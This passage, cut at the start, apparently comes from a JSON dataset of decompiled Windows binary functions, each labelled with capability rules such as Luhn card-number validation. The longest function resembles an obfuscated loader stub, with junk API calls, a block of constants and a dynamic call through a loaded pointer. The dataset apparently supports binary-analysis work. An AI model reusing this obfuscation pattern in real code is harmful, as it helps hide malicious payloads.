0;\n                    var_34h = 0x40441e;\n                    (*pcVar3)();\n                    var_34h = 0x403968;\n                    var_38h = NULL;\n                    var_3ch = NULL;\n                    var_40h = 0x40442d;\n                    (*_sym.imp.KERNEL32.dll_OpenJobObjectW)();\n                    var_40h = NULL;\n                    var_44h = NULL;\n                    var_48h = NULL;\n                    var_4ch = 0;\n                    var_50h = NULL;\n                    var_54h = 0x404439;\n                    (*pcVar2)();\n                    var_54h = &fcn.00404240::lpVersionInformation;\n                    var_58h = 0x404446;\n                    (*_sym.imp.KERNEL32.dll_GetVersionExW)();\n                    var_58h = NULL;\n                    var_5ch = &fcn.00404240::lpConsoleTitle;\n                    var_60h = 0x404455;\n                    (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)();\n                }\n                uVar10 = uVar10 + 1;\n            } while (uVar10 < *0x820cd4);\n        }\n        pcVar7 = _sym.imp.USER32.dll_CharUpperBuffA;\n        pcVar3 = _sym.imp.USER32.dll_LoadIconW;\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapSetInformation;\n        lpSectorsPerCluster = 0;\n        do {\n            if (*0x820cd4 + lpSectorsPerCluster == 0x392) {\n                lpNumberOfFreeClusters = 0;\n                lpTotalNumberOfClusters = NULL;\n                lpBinaryType = 0;\n                var_28h = 0;\n                var_2ch = 0x40448f;\n                (*pcVar2)();\n                var_2ch = 0x403a08;\n                var_30h = 0;\n                var_34h = 0x404498;\n                (*pcVar3)();\n                var_34h = NULL;\n                var_38h = &fcn.00404240::lpConsoleTitle;\n                var_3ch = 0x4044a3;\n                (*pcVar7)();\n                var_3ch = NULL;\n                var_40h = &fcn.00404240::lpBinaryType;\n                var_44h = 0x4044af;\n                (*_sym.imp.KERNEL32.dll_InterlockedExchangeAdd)();\n                var_44h = NULL;\n                var_48h = &fcn.00404240::lpsz;\n                var_4ch = 0;\n                var_50h = 0x4044c0;\n                (*_sym.imp.USER32.dll_RealGetWindowClassA)();\n                var_50h = &fcn.00404240::var_f40h;\n                var_54h = 0x4044cd;\n                (*_sym.imp.USER32.dll_CharUpperA)();\n                var_54h = NULL;\n                var_58h = &fcn.00404240::var_34h;\n                var_5ch = NULL;\n                var_60h = 0x4044db;\n                (*_sym.imp.USER32.dll_CopyAcceleratorTableA)();\n                var_60h = 0x403a44;\n                var_64h = 0x4044e6;\n                (*_sym.imp.KERNEL32.dll_DeleteVolumeMountPointW)();\n                var_64h = 0x4044ec;\n                (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthW)();\n            }\n            pcVar5 = _sym.imp.USER32.dll_GetCursorInfo;\n            pcVar4 = _sym.imp.USER32.dll_LoadMenuA;\n            lpSectorsPerCluster = lpSectorsPerCluster + 1;\n        } while (lpSectorsPerCluster < 0x4f95a3);\n        iVar9 = 0x4f4;\n        do {\n            lpNumberOfFreeClusters = 0;\n            lpTotalNumberOfClusters = 0x404514;\n            (*pcVar5)();\n            lpTotalNumberOfClusters = NULL;\n            lpBinaryType = 0;\n            var_28h = 0x40451a;\n            (*pcVar4)();\n            var_28h = 0x404520;\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            pcVar3 = _sym.imp.KERNEL32.dll_GetCurrentProcessId;\n            pcVar2 = _sym.imp.KERNEL32.dll_GetGeoInfoW;\n            iVar9 = iVar9 + -1;\n        } while (iVar9 != 0);\n        iVar9 = 0;\n        do {\n            lpNumberOfFreeClusters = 0x404539;\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            lpNumberOfFreeClusters = 0x40453b;\n            (*pcVar3)();\n            if (iVar9 < 0x26c0e8) {\n                var_110h = 0x3cb8a85;\n                var_18ch = 0x5bcdf878;\n                var_dch = 0x4fef9b2d;\n                var_6ch = 0x5c962e0;\n                var_15ch = 0xd80e17e;\n                var_134h = 0x21d2e8ed;\n                var_a4h = 0x5d71cb29;\n                var_1a0h = 0x5f53d8bd;\n                var_1d4h = 0x5ff1a856;\n                var_11ch = 0x7c43720b;\n                var_70h = 0x2e43ab6;\n                var_3ch = 0x4030cf84;\n                var_cch = 0x67c17cae;\n                var_138h = 0x7e92a07c;\n                var_5ch = 0x9162db6;\n                var_108h = 0x50f98d9c;\n                var_68h = 0x1b344916;\n                var_54h = 0x159f4855;\n                var_100h = 0x24b595d8;\n                var_1b8h = 0x4f5c8a81;\n                phModule = 0x6691ecf4;\n                var_d0h = 0x76a99d5c;\n                var_b0h = 0x3fdcfbbd;\n                var_1c0h = 0x58ea43f3;\n                var_c4h = 0xf6d01;\n                var_148h = 0xf6ab76c;\n                var_94h = 0x1b8e99f4;\n                lpSectorsPerCluster = 0x43107fe5;\n                var_60h = 0x30495978;\n                var_158h = 0x7ef60912;\n                var_130h = 0x69737902;\n                var_14ch = 0x6c5b7ffc;\n                var_bch = 0x129d89bc;\n                var_180h = 0x16d5b5e1;\n                var_80h = 0x6836f3cb;\n                var_168h = 0x89753a2;\n                var_58h = 0x2204398e;\n                var_144h = 0x3cf89d9;\n                var_10ch = 0x2f23e271;\n                var_a8h = 0x743251de;\n                var_88h = 0x6e09af87;\n                var_198h = 0xa352585f;\n                var_1cch = 0x20c017a0;\n                var_e0h = 0x46841ad5;\n                var_1a8h = 0x139d5313;\n                var_b4h = 0x40ff0f94;\n                var_174h = 0x771cfb0e;\n                var_19ch = 0x679f49b1;\n                var_40h = 0x996c6601;\n                var_44h = 0x4bf616d6;\n                var_f4h = 0x88c3dccb;\n                var_128h = 0x264947b3;\n                var_1b4h = 0x8b54546d;\n                var_78h = 0x46da3c1f;\n                var_160h = 0xda4e3c14;\n                var_e4h = 0xc8ada8a7;\n                var_fch = 0x1eedffbb;\n                var_118h = 0x5bcb5af6;\n                var_1d8h = 0x8993d8bd;\n                var_a0h = 0x17261dda;\n                var_1dch = 0xea2e69b2;\n                var_178h = 0xb756e4c4;\n                var_ach = 0xb6b95e2b;\n                var_84h = 0xf975706a;\n                var_1ach = 0xaad51852;\n                var_124h = 0x4d3b378a;\n                var_16ch = 0xe9b1332f;\n                var_e8h = 0x9d6d4272;\n                var_188h = 0x8ec3119e;\n                var_f0h = 0x98ae1afb;\n                var_1a4h = 0x8a051b0b;\n                var_f8h = 0xe32a6a75;\n                var_150h = 0xa7496b56;\n                var_90h = 0x29852a78;\n                var_184h = 0xde7318ca;\n                var_170h = 0xa59c0b74;\n                var_1c8h = 0x726efaf1;\n                var_c0h = 0x4261658a;\n                var_1d0h = 0xd6a6a03a;\n                var_74h = 0xccf63fca;\n                var_190h = 0x85f89a2;\n                var_13ch = 0xaa71aab5;\n                var_50h = 0xf7330865;\n                var_64h = 0xab12a3b3;\n                var_1b0h = 0x11e7141e;\n                var_98h = 0xd2dd606d;\n                var_9ch = 0x5dbf2dad;\n                var_154h = 0x3d2a4e71;\n                var_d4h = 0xafa7a960;\n                var_48h = 0x6bc61ec5;\n                var_b8h = 0xe2059e64;\n                var_194h = 0xebb6e25e;\n                var_8ch = 0xaaf951fb;\n                var_164h = 0xa0ba13c4;\n                var_ech = 0x97420919;\n                var_4ch = 0xce1f0cb6;\n                var_7ch = 0x96ba81b5;\n                var_1c4h = 0x58423079;\n                var_104h = 0x18f6d41b;\n                var_d8h = 0x4192991b;\n                var_17ch = 0xf5883dc2;\n                lpBytesPerSector = 0x1d058a70;\n                var_1bch = 0x4d7f33ed;\n                var_12ch = 0xaaff4ae6;\n                var_114h = 0xa86b98bb;\n                var_140h = 0xe3ec5d85;\n                var_120h = 0x60b4f73f;\n                var_c8h = 0xabcf7fc0;\n            }\n            lpNumberOfFreeClusters = 0;\n            lpTotalNumberOfClusters = NULL;\n            lpBinaryType = 0;\n            var_28h = 0;\n            var_2ch = NULL;\n            var_30h = 0x4053a7;\n            (*pcVar2)();\n        } while ((iVar9 < 0x2735ca) && (iVar9 = iVar9 + 1,  iVar9 < 0x15a24e60));\n        lpNumberOfFreeClusters = 0x4053c1;\n        fcn.00404080();\n        iVar9 = 0;\n        do {\n            if (iVar9 == 0x26) {\n                lpNumberOfFreeClusters = 0x4053cd;\n                fcn.00404120();\n                iVar9 = extraout_EDX;\n            }\n            pcVar7 = _sym.imp.KERNEL32.dll_RemoveDirectoryW;\n            pcVar3 = _sym.imp.KERNEL32.dll_GetFileAttributesW;\n            pcVar2 = _sym.imp.KERNEL32.dll_MoveFileWithProgressA;\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x409495);\n        lpSectorsPerCluster = 0x7b;\n        do {\n            if (*0x820cd4 == 0x86) {\n                lpNumberOfFreeClusters = 0x403a70;\n                lpTotalNumberOfClusters = 0x405403;\n                (*pcVar7)();\n                lpTotalNumberOfClusters = 0x403ac8;\n                lpBinaryType = 0x40540a;\n                (*pcVar3)();\n                lpBinaryType = 0;\n                var_28h = 0;\n                var_2ch = NULL;\n                var_30h = 0;\n                var_34h = NULL;\n                var_38h = 0x405416;\n                (*pcVar2)();\n                var_38h = &fcn.00404240::lpBinaryType;\n                var_3ch = 0x403b3c;\n                var_40h = 0x405425;\n                (*_sym.imp.KERNEL32.dll_GetBinaryTypeA)();\n            }\n            pcVar6 = _sym.imp.KERNEL32.dll_FindNextVolumeMountPointW;\n            pcVar5 = _sym.imp.KERNEL32.dll_CreateActCtxA;\n            pcVar4 = _sym.imp.KERNEL32.dll_WriteConsoleW;\n            lpSectorsPerCluster = lpSectorsPerCluster + -1;\n        } while (lpSectorsPerCluster != 0);\n        lpSectorsPerCluster = 0x180ef;\n        do {\n            if (*0x820cd4 == 0x1f) {\n                lpNumberOfFreeClusters = 0;\n                lpTotalNumberOfClusters = &stack0xffffdcbc;\n                lpBinaryType = 0;\n                var_28h = 0x40545a;\n                (*pcVar6)();\n                var_28h = 0;\n                var_2ch = &fcn.00404240::var_2ch;\n                var_30h = 0;\n                var_34h = NULL;\n                var_38h = NULL;\n                var_3ch = 0x405468;\n                (*pcVar4)();\n                var_3ch = &fcn.00404240::var_228h;\n                var_40h = 0x405471;\n                (*pcVar5)();\n                var_40h = NULL;\n                var_44h = NULL;\n                var_48h = 0x40547b;\n                (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n                var_48h = NULL;\n                var_4ch = 0;\n                var_50h = &fcn.00404240::var_1740h;\n                var_54h = 0x40548c;\n                (*_sym.imp.KERNEL32.dll_GetConsoleAliasesA)();\n                var_54h = NULL;\n                var_58h = NULL;\n                var_5ch = NULL;\n                var_60h = 0x405498;\n                (*_sym.imp.KERNEL32.dll_EraseTape)();\n                var_60h = 0x403b48;\n                var_64h = 0;\n                var_68h = 0x4054a5;\n                (*_sym.imp.KERNEL32.dll_SetFileShortNameW)();\n                var_68h = NULL;\n                var_6ch = &fcn.00404240::var_1b40h;\n                var_70h = 0;\n                var_74h = 0x4054b6;\n                (*_sym.imp.KERNEL32.dll__hread)();\n                var_74h = 0;\n                var_78h = 0;\n                var_7ch = 0x4054c0;\n                (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n            }\n            lpSectorsPerCluster = lpSectorsPerCluster + -1;\n        } while (lpSectorsPerCluster != 0);\n        lpNumberOfFreeClusters = 0x403c0c;\n        lpTotalNumberOfClusters = 0x4054d5;\n        (*_sym.imp.KERNEL32.dll_LoadLibraryW)();\n        *0x820cc8 = *0x81f8b0;\n        lpTotalNumberOfClusters = 0x4054e1;\n        (**0x81f8b0)();\n        *in_FS_OFFSET = var_ch;\n        return;\n    }\n    lpNumberOfFreeClusters = 0x40378c;\n    lpTotalNumberOfClusters = NULL;\n    lpBinaryType = 0;\n    var_28h = 0x404284;\n    (*_sym.imp.KERNEL32.dll_OpenJobObjectW)();\n    var_28h = 0;\n    var_2ch = &fcn.00404240::lpString;\n    var_30h = 0;\n    var_34h = 0x404293;\n    (*_sym.imp.USER32.dll_GetKeyNameTextW)();\n    var_34h = 0x404299;\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    var_34h = &fcn.00404240::var_208h;\n    var_38h = NULL;\n    var_3ch = 0x4042a7;\n    (*_sym.imp.ole32.dll_ReadClassStg)();\n    var_3ch = &fcn.00404240::lpTotalNumberOfClusters;\n    var_40h = &fcn.00404240::lpNumberOfFreeClusters;\n    var_44h = &fcn.00404240::lpBytesPerSector;\n    var_48h = &fcn.00404240::lpSectorsPerCluster;\n    var_4ch = 0;\n    var_50h = 0x4042be;\n    (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceA)();\n    var_50h = &fcn.00404240::phModule;\n    var_54h = 0x40379c;\n    var_58h = NULL;\n    var_5ch = 0x4042ce;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)();\n    var_5ch = 0x4037cc;\n    var_60h = 0x4037e0;\n    var_64h = 0x4038a8;\n    var_68h = 0x4042e3;\n    (*_sym.imp.KERNEL32.dll_WritePrivateProfileSectionW)();\n    var_1e0h = 0xf;\n    var_1e4h = 0;\n    var_1f4h._0_1_ = 0;\n    var_4h = 0;\n    var_68h = 0x404305;\n    fcn.00406083();\n    var_68h = 0x40430d;\n    fcn.00406144();\n    var_68h = &fcn.00404240::var_28h;\n    var_28h = 0x403954;\n    var_6ch = 0x404320;\n    fcn.00406094(var_68h);\n    var_38h = 0x403c28;\n    var_6ch = 0x40432f;\n    fcn.00406144();\n    var_6ch = NULL;\n    var_70h = 0x404335;\n    fcn.0040676c(0);\n    var_70h = 0;\n    var_74h = 0x40433d;\n    fcn.0040641d(0);\n    var_74h = 0;\n    var_78h = 0;\n    var_7ch = 0x404344;\n    fcn.00406433(0, 0);\n    var_7ch = 0;\n    var_80h = 0;\n    var_84h = 0x40434b;\n    fcn.0040606c(0, 0);\n    var_84h = 0;\n    var_88h = 0;\n    var_8ch = 0x404352;\n    fcn.00406433(0, 0);\n    var_8ch = 0;\n    var_90h = 0x404358;\n    fcn.00406573(0);\n    pcVar8 = extraout_ECX;\n    do {\n        cVar1 = *pcVar8;\n        pcVar8[0x800108 - extraout_ECX] = cVar1;\n        pcVar8 = pcVar8 + 1;\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 6558
    },
    "00408eff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408eff(uint arg_8h)\n\n{\n    fcn.00408dd3(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "0040a911": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a925)\n// WARNING: Removing unreachable block (ram,0x0040a92b)\n// WARNING: Removing unreachable block (ram,0x0040a92d)\n\nvoid fcn.0040a911(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "00409eac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00409eac(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408f98(0x4123a8, 0xc);\n    fcn.0040b1b4(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x7ff608;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x7ff604;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00409ef0;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00407d3b(arg_8h_00);\ncode_r0x00409ef0:\n        fcn.00407d3b(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00409f13();\n    fcn.00408fdd();\n    return;\n}\n",
        "token_count": 402
    }
}